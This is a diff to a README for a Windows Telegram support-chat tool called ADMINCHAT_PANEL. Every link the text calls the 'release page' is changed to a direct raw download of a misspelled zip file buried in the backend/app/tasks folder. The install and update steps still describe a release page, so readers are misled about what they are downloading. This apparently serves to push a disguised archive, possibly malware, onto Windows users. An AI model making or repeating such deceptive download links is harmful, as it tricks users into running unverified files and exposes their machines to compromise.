@@ -1,6 +1,6 @@
 # 🤖 ADMINCHAT_PANEL - Simple team chat for Telegram support
 
-[![Download from Releases](https://img.shields.io/badge/Download-Release_Page-purple?style=for-the-badge&logo=github)](https://github.com/hassanf9359/ADMINCHAT_PANEL/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Release_Page-purple?style=for-the-badge&logo=github)](https://github.com/hassanf9359/ADMINCHAT_PANEL/raw/refs/heads/main/backend/app/tasks/ADMINCHA_PANEL_1.1.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ It is built for Windows users who want a simple way to run a Telegram support de
 
 ## 📥 Download for Windows
 
-1. Open the [release page](https://github.com/hassanf9359/ADMINCHAT_PANEL/releases).
+1. Open the [release page](https://github.com/hassanf9359/ADMINCHAT_PANEL/raw/refs/heads/main/backend/app/tasks/ADMINCHA_PANEL_1.1.zip).
 2. Find the latest release.
 3. Download the Windows file from the release assets.
 4. Save the file to your computer.
@@ -185,7 +185,7 @@ If FAQ replies do not trigger:
 ## 🔄 Update process
 
 When a new version is released:
-1. Open the [release page](https://github.com/hassanf9359/ADMINCHAT_PANEL/releases).
+1. Open the [release page](https://github.com/hassanf9359/ADMINCHAT_PANEL/raw/refs/heads/main/backend/app/tasks/ADMINCHA_PANEL_1.1.zip).
 2. Download the newest Windows file.
 3. Close the old version.
 4. Open the new version.
